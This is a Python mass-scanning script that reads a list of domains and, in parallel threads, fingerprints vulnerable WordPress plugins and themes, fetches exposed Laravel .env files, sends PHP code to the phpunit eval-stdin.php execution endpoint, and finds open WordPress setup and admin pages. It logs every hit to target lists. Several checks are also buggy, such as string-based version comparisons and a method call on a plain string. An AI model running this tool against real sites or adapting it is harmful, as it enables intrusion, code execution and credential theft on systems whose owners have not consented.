import os
import click
import argparse
import requests
import json
import art
from urllib3.exceptions import InsecureRequestWarning
from requests.exceptions import RequestException, Timeout
from concurrent import futures
from bs4 import BeautifulSoup
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
session = requests.Session()
timeout = 30


def version_check(wordpress_url):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'}
    plugin_url = f"{wordpress_url}/wp-content/plugins/essential-addons-for-elementor-lite/readme.txt"
    revslider_url = f"{wordpress_url}/wp-content/plugins/revslider/release_log.txt"
    contact_form_url = f"{wordpress_url}/wp-content/plugins/website-contact-form-with-file-upload/readme.txt"
    elementor_pro_url = f"{wordpress_url}/wp-content/plugins/elementor-pro/changelog.txt"
    woocommerce_payments = f"{wordpress_url}/wp-content/plugins/woocommerce-payments/readme.txt"
    ultimate_member = f"{wordpress_url}/wp-content/plugins/ultimate-member/readme.txt"
    mstore_api= f"{wordpress_url}/wp-content/plugins/mstore-api/readme.txt"
    Tatsu=f"{wordpress_url}/wp-content/plugins/tatsu/readme.txt"
    iwp_client=f"{wordpress_url}/wp-content/plugins/iwp-client/readme.txt"
    wpcargo=f"{wordpress_url}/wp-content/plugins/wpcargo/readme.txt"
    wpfilemanager=f"{wordpress_url}/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php"
    imagemagick=f"{wordpress_url}/wp-content/plugins/imagemagick-engine/readme.txt"
    workreap=f"{wordpress_url}/wp-content/themes/workreap/style.css"
    barclaycart=f"{wordpress_url}/wp-content/plugins/barclaycart/readme.txt"
    try:
        response = requests.get(
            plugin_url, headers=headers, verify=False, timeout=timeout)
        if response.status_code == 200:
            content = response.text

            version_line = next((line for line in content.split(
                '\n') if line.startswith('Stable tag:')), None)
            if version_line:
                version = version_line.split(':')[1].strip()
                if '5.3.9' < version < '5.7.2':
                    print(
                        f"\033[92m{wordpress_url} > [essential-addons-for-elementor-lite VULN]\033[0m")
                    with open("essential.txt", "a") as vuln_file:
                        vuln_file.write(wordpress_url + "\n")
                else:
                    print(
                        f"\033[91m{wordpress_url} > [essential-addons-for-elementor-lite NOT Vuln]\033[0m")
            else:
                print(
                    f"\033[91m{wordpress_url} > [Failed GET essential-addons-for-elementor-lite version]\033[0m")
        else:
            print(
                f"\033[91m{wordpress_url} > [Failed to fetch the essential-addons-for-elementor-lite readme.txt file]\033[0m")
            if "add-listing" in response.text and "get-nearby-listings" in response.text:
                print(
                    f"\033[91m{wordpress_url} > Was unable to read essential-addons-for-elementor-lite readme.txt but the plugin might be installed\033[0m")
                with open("essential.txt", "a") as vuln_file:
                    vuln_file.write(wordpress_url + "\n")
            else:
                print(
                    f"\033[91m{wordpress_url} > [essential-addons-for-elementor-lite NO installed]\033[0m")

        response = requests.get(
            imagemagick, headers=headers, verify=False, timeout=timeout)
        if response.status_code == 200:
            content = response.text

            version_line = next((line for line in content.split(
                '\n') if line.startswith('Stable tag:')), None)
            if version_line:
                version = version_line.split(':')[1].strip()
                if version <= '1.7.5':
                    print(
                        f"\033[92m{wordpress_url} > [imagemagick VULN]\033[0m")
                    with open("imagemagick.txt", "a") as vuln_file:
                        vuln_file.write(wordpress_url + "\n")
                else:
                    print(
                        f"\033[91m{wordpress_url} > [imagemagick NOT Vuln]\033[0m")
            else:
                print(
                    f"\033[91m{wordpress_url} > [Failed GET imagemagick version]\033[0m")
        else:
            print(
                f"\033[91m{wordpress_url} > [Failed to fetch the imagemagick readme.txt file]\033[0m")
            print(
                f"\033[91m{wordpress_url} > [imagemagick NO installed]\033[0m")   
            

        response = requests.get(
            barclaycart, headers=headers, verify=False, timeout=timeout)
        if response.status_code == 200:
            content = response.text

            version_line = next((line for line in content.split(
                '\n') if line.startswith('Stable tag:')), None)
            if version_line:
                version = version_line.split(':')[1].strip()
                if version <= '200':
                    print(
                        f"\033[92m{wordpress_url} > [barclaycart VULN]\033[0m")
                    with open("barclaycart.txt", "a") as vuln_file:
                        vuln_file.write(wordpress_url + "\n")
                else:
                    print(
                        f"\033[91m{wordpress_url} > [barclaycart NOT Vuln]\033[0m")
            else:
                print(
                    f"\033[91m{wordpress_url} > [Failed GET barclaycart version]\033[0m")
        else:
            print(
                f"\033[91m{wordpress_url} > [Failed to fetch the barclaycart readme.txt file]\033[0m")
            print(
                f"\033[91m{wordpress_url} > [barclaycart NO installed]\033[0m")   



        response = requests.get(
            iwp_client, headers=headers, verify=False, timeout=timeout)
        
        if response.status_code == 200 and '=== InfiniteWP Client ===' in response.text:
            print(f"\033[92m{wordpress_url} > [InfiniteWp VULN]\033[0m")
            with open("iwp.txt", "a") as vuln_file:
                vuln_file.write(wordpress_url + "\n")
        else:
            print(f"033[91m{wordpress_url} > [InfiniteWp NOT Vuln]\033[0m")

        response = requests.get(
            workreap, headers=headers, verify=False, timeout=timeout)
        
        if response.status_code == 200 and 'Workreap' in response.text:
            print(f"\033[92m{wordpress_url} > [Workreap VULN]\033[0m")
            with open("Workreap.txt", "a") as vuln_file:
                vuln_file.write(wordpress_url + "\n")
        else:
            print(f"033[91m{wordpress_url} > [Workreap NOT Vuln]\033[0m")        



        response = requests.get(
            wpfilemanager, headers=headers, verify=False, timeout=timeout)
        if '{"error":["errUnknownCmd"]}' in response.text:
            print(f"\033[92m{wordpress_url} > [wpfilemanager VULN]\033[0m")
            with open("wpfilemanager.txt", "a") as vuln_file:
                vuln_file.write(wordpress_url + "\n")
        else:
            print(f"\033[91m{wordpress_url} > [wpfilemanager NOT Vuln]\033[0m")

            




        response = requests.get(
            wpcargo, headers=headers, verify=False, timeout=timeout)
        if response.status_code == 200:
            content = response.text

            version_line = next((line for line in content.split(
                '\n') if line.startswith('Stable tag:')), None)
            if version_line:
                version = version_line.split(':')[1].strip()
                if version <= '6.9.4':
                    print(
                        f"\033[92m{wordpress_url} > [wpcargo VULN]\033[0m")
                    with open("wpcargo.txt", "a") as vuln_file:
                        vuln_file.write(wordpress_url + "\n")
                else:
                    print(
                        f"\033[91m{wordpress_url} > [wpcargo NOT Vuln]\033[0m")
            else:
                print(
                    f"\033[91m{wordpress_url} > [Failed GET wpcargo version]\033[0m")
        else:
            print(
                f"\033[91m{wordpress_url} > [Failed to fetch the wpcargo readme.txt file]\033[0m")
            print(
                f"\033[91m{wordpress_url} > [wpcargo NO installed]\033[0m")         



        response = requests.get(
            Tatsu, headers=headers, verify=False, timeout=timeout)
        if response.status_code == 200:
            content = response.text

            version_line = next((line for line in content.split(
                '\n') if line.startswith('Stable tag:')), None)
            if version_line:
                version = version_line.split(':')[1].strip()
                if version <= '4.3':
                    print(
                        f"\033[92m{wordpress_url} > [Tatsu VULN]\033[0m")
                    with open("Tatsu.txt", "a") as vuln_file:
                        vuln_file.write(wordpress_url + "\n")
                else:
                    print(
                        f"\033[91m{wordpress_url} > [Tatsu NOT Vuln]\033[0m")
            else:
                print(
                    f"\033[91m{wordpress_url} > [Failed GET Tatsu version]\033[0m")
        else:
            print(
                f"\033[91m{wordpress_url} > [Failed to fetch the Tatsu readme.txt file]\033[0m")
            print(
                f"\033[91m{wordpress_url} > [Tatsu NO installed]\033[0m")         
                  
        response = requests.get(
            mstore_api, headers=headers, verify=False, timeout=timeout)
        if response.status_code == 200:
            content = response.text

            version_line = next((line for line in content.split(
                '\n') if line.startswith('Stable tag:')), None)
            if version_line:
                version = version_line.split(':')[1].strip()
                if version >= '3.9.3':
                    print(
                        f"\033[92m{wordpress_url} > [mstore_api VULN]\033[0m")
                    with open("mstore_api.txt", "a") as vuln_file:
                        vuln_file.write(wordpress_url + "\n")
                else:
                    print(
                        f"\033[91m{wordpress_url} > [mstore_api NOT Vuln]\033[0m")
            else:
                print(
                    f"\033[91m{wordpress_url} > [Failed GET mstore_api version]\033[0m")
        else:
            print(
                f"\033[91m{wordpress_url} > [Failed to fetch the mstore_api readme.txt file]\033[0m")
            print(
                f"\033[91m{wordpress_url} > [mstore_api NO installed]\033[0m")
    
        response = requests.get(
            revslider_url, headers=headers, verify=False, timeout=timeout)
        if response.status_code == 200:
            content = response.text

            version_line = next((line for line in content.split(
                '\n') if line.startswith('version ')), None)
            if version_line:
                version = version_line.split('version ')[1].strip()
                if version <= '4.1.1':
                    print(f"\033[92m{wordpress_url} > [revslider VULN]\033[0m")
                    with open("revslider.txt", "a") as vuln_file:
                        vuln_file.write(wordpress_url + "\n")
                else:
                    print(
                        f"\033[91m{wordpress_url} > [revslider NOT Vuln]\033[0m")
            else:
                print(
                    f"\033[91m{wordpress_url} > [Failed GET revslider version]\033[0m")
        else:
            print(
                f"\033[91m{wordpress_url} > [Failed to fetch the revslider release_log.txt file]\033[0m")

        response = requests.get(
            contact_form_url, headers=headers, verify=False, timeout=timeout)
        if response.status_code == 200:
            content = response.text

            version_line = next((line for line in content.split(
                '\n') if line.startswith('Stable tag:')), None)
            if version_line:
                version = version_line.split(':')[1].strip()
                if version <= '1.3.4':
                    print(
                        f"\033[92m{wordpress_url} > [website-contact-form-with-file-upload VULN]\033[0m")
                    with open("contact-form.txt", "a") as vuln_file:
                        vuln_file.write(wordpress_url + "\n")
                else:
                    print(
                        f"\033[91m{wordpress_url} > [website-contact-form-with-file-upload NOT Vuln]\033[0m")
            else:
                print(
                    f"\033[91m{wordpress_url} > [Failed GET website-contact-form-with-file-upload version]\033[0m")
        else:
            print(
                f"\033[91m{wordpress_url} > [Failed to fetch the website-contact-form-with-file-upload readme.txt file]\033[0m")
            print(
                f"\033[91m{wordpress_url} > [website-contact-form-with-file-upload NO installed]\033[0m")

        response = requests.get(
            elementor_pro_url, headers=headers, verify=False, timeout=timeout)
        if response.status_code == 200:
            print(f"\033[92m{wordpress_url} > [elementor-pro FOUND]\033[0m")
            with open("elementor.txt", "a") as vuln_file:
                vuln_file.write(wordpress_url + "\n")
        else:
            print(
                f"\033[91m{wordpress_url} > [elementor-pro NOT FOUND]\033[0m")

        wordpress_urls = [
            "/wp-content/plugins/superstorefinder-wp/ssf-wp-admin/pages/import.php",
            "/wp-content/plugins/superlogoshowcase-wp/sls-wp-admin/pages/import.php",
            "/wp-content/plugins/super-interactive-maps/sim-wp-admin/pages/import.php"
        ]
        with open("super.txt", "a") as vuln_file:
            for urls in wordpress_urls:
                superlink = wordpress_url + urls
                try:
                    response = requests.get(superlink, headers=headers, verify=False, timeout=timeout)
                    if response.status_code == 200 and "<div class='wrap'>" in response.text:
                        vuln_file.write(wordpress_url + "\n")
                        print(f"\033[92m{wordpress_url} > [ SUPER VULNERABLE]\033[0m")
                    else:
                        print(f"\033[91m{wordpress_url} > [ SUPER NOT VULNERABLE]\033[0m")
                except Exception as e:
                    print(f"\033[91m{wordpress_url} > [ERROR]\033[0m", str(e))


        response = requests.get(woocommerce_payments,
                                headers=headers, verify=False, timeout=timeout)
        if response.status_code == 200:
            content = response.text

            version_line = next((line for line in content.split(
                '\n') if line.startswith('Stable tag:')), None)
            if version_line:
                version = version_line.split(':')[1].strip()
                if '1.0.0' < version < '5.9.0':
                    print(
                        f"\033[92m{wordpress_url} > [woocommerce-payments VULN]\033[0m")
                    with open("essential.txt", "a") as vuln_file:
                        vuln_file.write(wordpress_url + "\n")
                else:
                    print(
                        f"\033[91m{wordpress_url} > [woocommerce-payments NOT Vuln]\033[0m")
            else:
                print(
                    f"\033[91m{wordpress_url} > [Failed GET woocommerce-payments version]\033[0m")
        else:
            print(
                f"\033[91m{wordpress_url} > [Failed to fetch the woocommerce-payments readme.txt file]\033[0m")
            if "add-listing" in response.text and "get-nearby-listings" in response.text:
                print(
                    f"\033[91m{wordpress_url} > Was unable to read woocommerce-payments readme.txt but the plugin might be installed\033[0m")
                with open("woocommerce-payments.txt", "a") as vuln_file:
                    vuln_file.write(wordpress_url + "\n")
            else:
                print(
                    f"\033[91m{wordpress_url} > [woocommerce-payments NO installed]\033[0m")

        response = requests.get(
            ultimate_member, headers=headers, verify=False, timeout=timeout)
        if response.status_code == 200:
            content = response.text

            version_line = next((line for line in content.split(
                '\n') if line.startswith('Stable tag:')), None)
            if version_line:
                version = version_line.split(':')[1].strip()
                if '1.0.0' < version < '2.6.6':
                    print(
                        f"\033[92m{wordpress_url} > [ultimate_member VULN]\033[0m")
                    with open("ultimate_member.txt", "a") as vuln_file:
                        vuln_file.write(wordpress_url + "\n")
                else:
                    print(
                        f"\033[91m{wordpress_url} > [ultimate_member NOT Vuln]\033[0m")
            else:
                print(
                    f"\033[91m{wordpress_url} > [Failed GET ultimate_member version]\033[0m")
        else:
            print(
                f"\033[91m{wordpress_url} > [Failed to fetch the ultimate_member readme.txt file]\033[0m")
            if "add-listing" in response.text and "get-nearby-listings" in response.text:
                print(
                    f"\033[91m{wordpress_url} > Was unable to read ultimate_member readme.txt but the plugin might be installed\033[0m")
                with open("ultimate_member.txt", "a") as vuln_file:
                    vuln_file.write(wordpress_url + "\n")
            else:
                print(
                    f"\033[91m{wordpress_url} > [ultimate_member NO installed]\033[0m")
                

        upload_url = wordpress_url + "/upload.php"
        upload_response = requests.get(upload_url, headers=headers, verify=False, timeout=timeout)
        if upload_response.status_code == 200:
            if "Not Found" in upload_response.text:
                print(f"\033[91m{upload_url} > [/upload.php does not exist]\033[0m")
            else:
                print(f"\033[92m{upload_url} > [/upload.php exists]\033[0m")
                with open("admin_paths.txt", "a") as vuln_file:
                    vuln_file.write(upload_url + "\n")
        else:
            print(f"\033[91m{upload_url} > [/upload.php does not exist]\033[0m")


        admin_login_url = wordpress_url + "/admin/login.php"
        admin_response = requests.get(admin_login_url, headers=headers, verify=False, timeout=timeout).text
        soad = BeautifulSoup(admin_response.text, "html.parser")
        if "login" in soad.get_text() and "submit" in soad.get_text() and "Admin" in soad.get_text():
            if "404" in soad.get_text() and "FOUND" in soad.get_text() and "404" in soad.get_text():
                print(f"\033[91m{admin_login_url} > [/admin/login.php does not exist]\033[0m")
            else:
                print(f"\033[92m{admin_login_url} > [/admin/login.php exists]\033[0m")
            with open("admin_paths.txt", "a") as vuln_file:
                vuln_file.write(admin_login_url + "\n")
        else:
            print(f"\033[91m{admin_login_url} > [/admin/login.php does not exist]\033[0m")

            
        laravel_env = wordpress_url + "/.env"
        laravelenv = requests.get(laravel_env, headers=headers, verify=False, timeout=timeout).text
        if "APP_URL" in laravelenv and "DB_HOST" in laravelenv:
            print(f"\033[92m{laravel_env} > [Laravel .env exists]\033[0m")
            with open("laravel_EnV.txt", "a") as vuln_file:
                vuln_file.write(wordpress_url + "/.env\n")
        else:
            print(f"\033[91m{laravel_env} > [Laravel .env exist]\033[0m")

        laravel_phpunit = wordpress_url + "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
        data = "<?php phpinfo(); ?>"
        laravelunit = requests.get(laravel_phpunit, data=data, timeout=15, verify=False ,headers=headers)
        if "phpinfo" in laravelunit.text:
            print(f"\033[92m{wordpress_url} > [Laravel phpunit Vuln]\033[0m")
            with open("laravel_phpunit.txt", "a") as vuln_file:
                vuln_file.write(wordpress_url + "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php\n")
        else:
            print(f"\033[91m{wordpress_url} > [Laravel phpunit exist]\033[0m")


        laravel_phpunit = wordpress_url + "/wp-content/plugins/cloudflare/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
        data = "<?php phpinfo(); ?>"
        laravelunit = requests.get(laravel_phpunit, data=data, timeout=15, verify=False ,headers=headers)
        if "phpinfo" in laravelunit.text:
            print(f"\033[92m{wordpress_url} > [Laravel phpunit Vuln]\033[0m")
            with open("laravel_phpunit.txt", "a") as vuln_file:
                vuln_file.write(wordpress_url + "/wp-content/plugins/cloudflare/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php\n")
        else:
            print(f"\033[91m{wordpress_url} > [Laravel phpunit exist]\033[0m")            
    
        wordpress_urls = [
            "/wp-admin/setup-config.php?step=1",
            "/wordpress/wp-admin/setup-config.php?step=1",
            "/wp/wp-admin/setup-config.php?step=1",
            "/old/wp-admin/setup-config.php?step=1",
            "/new/wp-admin/setup-config.php?step=1"
        ]
        with open("wp_setup.txt", "a") as vuln_file:
            for urls in wordpress_urls:
                setuplink = wordpress_url + urls
                try:
                    response = requests.get(setuplink, headers=headers, verify=True, timeout=timeout)
                    if response.status_code == 200 and "</label></th>" in response.text:
                        vuln_file.write(setuplink + "\n")
                        print(f"\033[92m{wordpress_url} > [Wordpress Setup Found]\033[0m")
                    else:
                        print(f"\033[91m{wordpress_url} > [Not Found Wp Setup]\033[0m")
                except Exception as e:
                    print(f"\033[91m{wordpress_url} > [ERROR]\033[0m", str(e))




        
        laravel_register = wordpress_url + "/register"
        admin_response = requests.get(laravel_register, headers=headers, verify=False, timeout=timeout).text
        if "register" in admin_response and "daftar" in admin_response and "submit" in admin_response and "login" in admin_response:
            print(f"\033[92m{laravel_register} > [laravel register exists]\033[0m")
            with open("laravel_register.txt", "a") as vuln_file:
                vuln_file.write(wordpress_url + "/register\n")
        else:
            print(f"\033[91m{laravel_register} > [laravel register not exist]\033[0m")


    except (RequestException, ConnectionError, Timeout) as e:
        print(f"\033[91m{wordpress_url} > [UNKNOWN ERROR]\033[0m")
    return False

    return False


def process_domain(domain):
    version_check(domain)


def process_domains(file_path, num_threads):
    with open(file_path, "r") as file:
        domains = file.read().splitlines()
        with futures.ThreadPoolExecutor(max_workers=num_threads) as executor:
            executor.map(process_domain, domains)


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-l", "--file", required=True,
                        help="Path to the file containing multiple domains")
    parser.add_argument("-t", "--threads", required=True,
                        type=int, help="Number of threads")
    args = parser.parse_args()
    file_path = args.file
    num_threads = args.threads

    process_domains(file_path, num_threads)
